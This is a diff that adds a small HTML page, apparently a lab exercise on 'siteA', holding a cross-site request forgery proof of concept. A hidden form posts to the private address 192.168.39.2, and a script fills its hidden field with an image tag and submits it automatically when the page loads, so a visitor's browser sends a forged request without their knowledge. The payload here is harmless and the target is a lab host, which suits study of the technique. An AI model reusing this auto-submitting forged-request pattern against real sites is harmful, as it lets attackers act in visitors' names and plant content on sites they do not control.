@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hehe</title>
+</head>
+<style>
+    button {
+        align-items: center;
+    }
+</style>
+<body>
+    <!-- หน้าใน siteA (ง่ายๆ) -->
+    <form id="csrfForm" action="http://192.168.39.2" method="POST">
+        <textarea hidden id="content" name="content"></textarea>
+    </form>
+    
+</body>
+<script>
+    window.addEventListener('load', function (){
+        document.getElementById('content').value = '<img src="https://i.kym-cdn.com/photos/images/original/001/880/471/a03.jpg">';
+        document.getElementById('csrfForm').submit();
+    });
+</script>
+</html>
